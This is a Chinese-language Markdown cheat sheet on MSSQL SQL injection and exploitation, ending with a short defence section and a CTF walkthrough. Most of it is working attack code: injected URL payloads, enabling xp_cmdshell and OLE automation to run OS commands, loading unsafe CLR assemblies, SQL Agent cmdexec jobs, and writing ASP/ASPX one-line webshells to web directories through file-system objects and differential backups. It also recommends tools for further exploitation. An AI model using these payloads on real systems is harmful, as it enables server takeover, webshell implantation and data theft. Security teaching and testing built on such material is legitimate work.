# MSSQL SQL注入&漏洞利用

## 一句话理解
MSSQL 注入除了常规数据读取外，往往更值得关注数据库扩展能力、系统存储过程和命令执行组件，因为一旦权限足够，利用链很容易从数据库层直接打到主机层。

## 常见危害
- 登录绕过、数据读取
- 枚举库表列和账号权限
- 报错、布尔、时间型无回显利用
- 调用扩展存储过程执行系统命令
- 配合提权组件进一步拿系统权限

## 基础特点
与 MySQL 相比，MSSQL 的利用重点常在：
- 系统表和系统视图
- 扩展存储过程
- 堆叠查询支持
- `xp_cmdshell`、`sp_configure` 等高危能力

推荐：
- [MSSQL 注入与提权方法整理](https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/)

## 常见利用方向
### 1. 数据枚举
重点枚举：
- 当前数据库
- 当前用户
- 数据库版本
- 表、列、权限

#### 基本信息

```sql
select db_name();      -- 当前数据库
select @@version;      -- 数据库版本（含操作系统与补丁信息）
select user;           -- 当前数据库用户
select system_user;    -- 当前登录名（如 sa）
select @@servername;   -- 服务器实例名
```

无回显位时，可用报错注入直接带出版本：

```sql
-- 报错：将 nvarchar 值 'Microsoft SQL Server ...' 转换成数据类型 int 失败
select convert(int,@@version);
```

#### 枚举库、表、列

```sql
-- 枚举所有数据库
select name from master..sysdatabases;
-- 过滤系统库（dbid>4），只看用户库
select name from master..sysdatabases where dbid>4;

-- 枚举当前库所有用户表（xtype='U' 为用户表）
select name from sysobjects where xtype='U';
-- 指定库枚举表
select name from webdb..sysobjects where xtype='U';
-- SQL Server 2005+ 新写法
select name from sys.tables;
-- 兼容视图写法
select table_name from information_schema.tables;

-- 枚举 users 表所有列
select name from syscolumns where id=object_id('users');
-- 兼容视图写法
select column_name from information_schema.columns where table_name='users';
```

#### 当前用户与权限

```sql
-- 是否 sysadmin 服务器角色（1=是，0=否）
select IS_SRVROLEMEMBER('sysadmin');
-- 是否 db_owner 数据库角色
select IS_MEMBER('db_owner');
-- 一次判断多个角色
select IS_SRVROLEMEMBER('sysadmin'),IS_SRVROLEMEMBER('securityadmin'),IS_MEMBER('db_owner');
```

> 权限结论直接决定后续走哪条链：`sysadmin` 可改配置开组件（xp_cmdshell / OLE / CLR），`db_owner` 可走差异备份写 WebShell，低权限只能继续常规数据读取。

### 2. 堆叠查询
MSSQL 在很多场景下更容易遇到堆叠查询利用，例如：
- `;`
- 多语句执行
- 调用存储过程

### 3. 扩展存储过程
一旦权限允许，MSSQL 的扩展存储过程会显著扩大攻击面。

## 命令执行
### `xp_cmdshell`
这是 MSSQL 最经典的高危能力之一，可直接执行操作系统命令。

#### 1. 判断组件是否存在

```sql
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

#### 2. 开启 `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### 3. 执行命令

```sql
exec master..xp_cmdshell 'whoami'
```

#### 4. 恢复被删除组件

```sql
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
```

> 实战中是否能成功，强依赖当前数据库权限、SQL Server 配置和宿主机环境。

### `sp_oacreate` + OLE 自动化（xp_cmdshell 被禁时）
`xp_cmdshell` 被删除或无法启用时，OLE 自动化是首选替代路径：通过 `sp_oacreate` 创建 `wscript.shell`、`scripting.filesystemobject` 等 COM 对象，执行命令或读写文件，完全不依赖扩展存储过程。

#### 1. 开启 OLE 自动化

```sql
-- OLE Automation Procedures 默认关闭，需先开启（通常要求 sysadmin）
exec sp_configure 'show advanced options',1; reconfigure;
exec sp_configure 'Ole Automation Procedures',1; reconfigure;
```

#### 2. 执行命令并回显到文件

```sql
declare @o int;
exec sp_oacreate 'wscript.shell',@o out;
-- 无回显场景：命令结果重定向到 Web 目录，再通过 HTTP 访问读取
exec sp_oamethod @o,'run',null,'cmd /c whoami > c:\www\out.txt';
```

#### 3. FSO 读文件回显（注入点有回显位时）

```sql
declare @o int,@f int,@t int,@ret int;
declare @line varchar(8000);
exec sp_oacreate 'scripting.filesystemobject',@o out;
exec sp_oamethod @o,'opentextfile',@f out,'c:\www\out.txt',1;
exec sp_oamethod @f,'readall',@line out;
select @line;   -- 直接回显文件内容
```

#### 4. FSO 写文件（直接写 WebShell）

```sql
declare @o int,@f int,@t int,@ret int;
exec sp_oacreate 'scripting.filesystemobject',@o out;
exec sp_oamethod @o,'createtextfile',@f out,'c:\www\shell.aspx',1;
exec sp_oamethod @f,'writeline',null,'<%@ Page Language="Jscript"%><%eval(Request.Item["a"],"unsafe");%>';
```

要点：
- 不依赖 `xp_cmdshell`，是 CTF 中"xp_cmdshell 被禁"的标准降级路线
- 命令无直接回显时，重定向到 Web 目录再用 HTTP 读，是最通用的回显方式

### CLR 利用
当 `xp_cmdshell` 与 OLE 均不可用时，可加载恶意 CLR 程序集，把任意 .NET 代码注册成存储过程执行。

#### 1. 启用 CLR

```sql
exec sp_configure 'show advanced options',1; reconfigure;
exec sp_configure 'clr enabled',1; reconfigure;
```

#### 2. 加载程序集

```sql
-- SQL Server 2017+ 默认开启 CLR 严格安全（clr strict security），
-- 未签名程序集会被拒绝，需先用 sp_add_trusted_assembly 注册 dll 的 SHA256 哈希
-- exec sp_add_trusted_assembly 0x<dll的SHA256哈希>;

-- 从文件加载
create assembly clr_shell from 'c:\www\shell.dll' with permission_set=unsafe;
-- 从 16 进制流加载（无需先落盘）
-- create assembly clr_shell from 0x4D5A9000... with permission_set=unsafe;
```

#### 3. 映射存储过程并执行

```sql
create procedure [dbo].[execcmd] @cmd nvarchar(200)
external name [clr_shell].[StoredProcedures].[ExecCmd];
exec execcmd 'whoami';
```

> dll 编译要点：用 Visual Studio 新建「SQL Server 数据库项目」（SQLCLR），编写带 `[SqlProcedure]` 特性的 `ExecCmd` 静态方法，.NET Framework 版本需与目标服务器匹配（2008=3.5、2012+=4.x），编译生成 dll 后建议签名再加载。

### 代理作业提权（SQL Server Agent）
SQL Server Agent 作业的 `cmdexec` 子系统可直接执行系统命令，常作为 xp_cmdshell 与 OLE 均不可用时的备用路径。

前提：
- `sysadmin` 权限
- SQL Server Agent 服务已启动

```sql
-- 0.（可选）先确认 Agent 服务状态：返回 Running / Stopped
-- exec master.dbo.xp_servicecontrol 'querystate','SQLServerAgent';

-- 1. 创建作业
exec sp_add_job @job_name='test';
-- 2. 添加作业步骤（cmdexec 子系统执行系统命令，结果重定向到文件）
exec sp_add_jobstep @job_name='test',@step_name='test',@subsystem='cmdexec',@command='whoami > c:\www\job.txt';
-- 3. 绑定到当前服务器
exec sp_add_jobserver @job_name='test',@server_name=@@servername;
-- 4. 启动作业
exec sp_start_job @job_name='test';
```

要点：
- 作业执行没有直接回显，命令结果需重定向到文件或通过 DNS/HTTP 外带
- Agent 服务未启动时作业会一直处于"等待执行"，需先确认服务状态

## 文件写入 GetShell
### 差异备份写 WebShell

前提条件：
- `db_owner` 及以上权限（需要 `alter database`、`backup` 权限）
- 已知网站物理路径
- 数据库可写（能建表、插入数据）
- SQL Server 服务账户对 Web 目录有写权限

```sql
-- 0.（可选）确认当前恢复模式
select name,recovery_model_desc from sys.databases where name='webdb';

-- 1. 改为完整恢复模式（差异备份的前提）
alter database webdb set recovery full;

-- 2. 建表 + 一次完整备份作为差异基线
create table cmd(str image);
backup database webdb to disk='c:\www\b.bak' with init;

-- 3. 插入 webshell 内容
-- 0x3C25657865637574652872657175657374282261222929253E 即 <%execute(request("a"))%>（ASP 一句话）
insert into cmd(str) values(0x3C25657865637574652872657175657374282261222929253E);

-- 4. 差异备份落 shell
backup database webdb to disk='c:\www\shell.asp' with differential;

-- 5. 清理
drop table cmd;
```

要点：
- 差异备份文件中 webshell 前后夹杂日志数据，IIS 解析 ASP/ASPX 时通常能容忍前后"垃圾"解析出中间的代码，因此后缀取决于中间件：ASP/ASPX 环境成功率高，PHP 环境基本不可行
- 完整备份 `b.bak` 只是为了生成差异基线，可备份到任意可写目录，不必留在 Web 目录
- 新版 sqlmap 可用 `--sql-shell` 进入 SQL 交互终端，逐条执行上述链路，比堆叠注入逐条打更顺手

## 综合利用工具
拿到 MSSQL 账号密码直连后的提权利用，优先用现成工具（均已在总 README 提及）：

- [SharpSQLTools](https://github.com/uknowsec/SharpSQLTools)：MSSQL 专用 C# 交互式菜单工具，一键切换 xp_cmdshell / sp_oacreate / CLR / 代理作业 / 文件上传下载 / 注册表读取等模块，免手工拼 SQL
- [Databasetools](https://github.com/Hel10-Web/Databasetools)：多数据库（MSSQL/Oracle/MySQL/PostgreSQL）密码爆破 + 综合利用一体，内置 MSSQL 命令执行与提权链（注意：程序检测参数不能为空，空口令无法利用）
- [Sylas](https://github.com/Ryze-T/Sylas)：多数据库综合利用工具，覆盖常见库的连接测试、命令执行与文件管理，可作前两者的替代选择

sqlmap 相关：
- `--os-shell` 对 MSSQL 默认走 xp_cmdshell 流程：枚举权限 → 通过 `sp_configure` 尝试启用 xp_cmdshell → `exec master..xp_cmdshell` 执行命令 → 进入交互 shell；xp_cmdshell 不可用时 sqlmap 不会自动降级到 sp_oacreate / CLR，需手工接管
- `--sql-shell` 进入 SQL 交互终端，可配合手工执行差异备份写 WebShell、sp_oacreate、CLR 等链路

## 案例：一道 MSSQL 注入 CTF 完整流程

场景：`http://x.x.x.x/index.aspx?id=1`，ASP.NET + MSSQL 环境，flag 在服务器 `c:\flag.txt`。

### 1. 判断数据库类型

```sql
?id=1 and 1=convert(int,@@version)--
```

报错回显：

```text
Conversion failed when converting the nvarchar value
'Microsoft SQL Server 2019 (RTM) ...' to data type int.
```

- `convert` 报错直接带出版本信息 → 确认为 MSSQL，且报错注入可用
- 辅助特征：单引号报错风格（`Microsoft OLE DB Provider for SQL Server`）、注释符 `--` 生效、用 `len()` 而非 `length()`

### 2. 确认堆叠查询

```sql
-- 有回显位：直接看第二条语句结果
?id=1;select 666--
-- 无回显位：延时验证
?id=1;waitfor delay '0:0:5'--
```

页面回显 666 / 延迟 5 秒 → 堆叠可用，进入利用阶段。

### 3. 枚举信息与权限

```sql
?id=1;select db_name()--                     -- 当前库：webdb
?id=1;select system_user--                   -- 登录名：sa
?id=1;select IS_SRVROLEMEMBER('sysadmin')--  -- 返回 1：sysadmin 高权限
```

### 4. 尝试 xp_cmdshell（被禁）

```sql
?id=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure--
?id=1;exec master..xp_cmdshell 'whoami'--
```

组件被删，尝试恢复也失败：

```sql
?id=1;exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\xplog70.dll'--
```

→ 放弃 xp_cmdshell，降级到 OLE 自动化。

### 5. sp_oacreate 开启 OLE 并写文件回显

```sql
-- 开启 OLE 自动化
?id=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure--
-- 执行命令，结果重定向到 Web 目录
?id=1;declare @o int;exec sp_oacreate 'wscript.shell',@o out;exec sp_oamethod @o,'run',null,'cmd /c whoami > c:\www\out.txt'--
```

访问 `http://x.x.x.x/out.txt`：

```text
nt authority\network service
```

命令执行成功（Web 路径可通过报错页、配置泄露或 `exec master..xp_dirtree 'c:\',1,1` 枚举目录获得）。

### 6. 读取 flag

```sql
?id=1;declare @o int;exec sp_oacreate 'wscript.shell',@o out;exec sp_oamethod @o,'run',null,'cmd /c type c:\flag.txt > c:\www\out.txt'--
```

再次访问 `out.txt` 拿到 flag。

变体：注入点有回显位时，用 FSO 直接回显文件内容，无需落盘：

```sql
?id=1;declare @o int,@f int,@t int,@ret int;declare @line varchar(8000);exec sp_oacreate 'scripting.filesystemobject',@o out;exec sp_oamethod @o,'opentextfile',@f out,'c:\flag.txt',1;exec sp_oamethod @f,'readall',@line out;select @line--
```

### 7. 流程小结

```text
判断 DB 类型（convert 报错）→ 堆叠验证（select 666 / waitfor 延时）
→ 权限枚举（sysadmin）→ xp_cmdshell 被禁 → sp_oacreate 开启 OLE
→ 命令重定向到 Web 目录 → HTTP 读文件回显 → 拿到 flag
```

## 实战排查思路
### 1. 先确认是否可注入
和其他数据库一样，先判断：
- 闭合方式
- 是否有回显
- 是否支持堆叠查询

### 2. 再判断权限边界
MSSQL 的危险性高度依赖权限，重点确认：
- 是否为高权限用户
- 是否可执行存储过程
- 是否可修改配置

### 3. 最后再看主机层利用
优先判断：
- `xp_cmdshell`
- 代理作业
- OLE 自动化
- 其他高危扩展能力

## 防御要点
### 1. 参数化查询
这仍是数据库注入防御的核心。

### 2. 关闭或限制高危组件
尤其是：
- `xp_cmdshell`
- `Ole Automation Procedures`
- `clr enabled`
- 高危扩展存储过程
- 不必要的外部调用能力
- SQL Server Agent 作业创建权限（仅限 DBA）

### 3. 最小权限
应用数据库账户不应拥有：
- `sysadmin`
- 修改配置权限
- 执行高危扩展过程权限

### 4. 隐藏详细报错
避免把 MSSQL 错误栈、对象名、过程名暴露给前端。

## 速查清单
- 先判断是否支持堆叠查询
- 先枚举版本、用户、权限
- 重点检查 `xp_cmdshell` 是否存在、是否可启用
- xp_cmdshell 不通时按 sp_oacreate → CLR → 代理作业顺序降级
- db_owner 且已知 Web 路径时，优先试差异备份写 WebShell
- 拿到 sa 口令直连时，直接上 SharpSQLTools / Databasetools
- 结合当前账户权限评估能否从库层打到主机层
- 不只盯数据读取，还要看系统过程和提权链

## Reference
- [MSSQL 注入与提权方法整理](https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/)
- https://www.freebuf.com/vuls/276814.html
- https://xz.aliyun.com/t/7534
- [PayloadsAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [微软官方 sp_configure 文档](https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql)
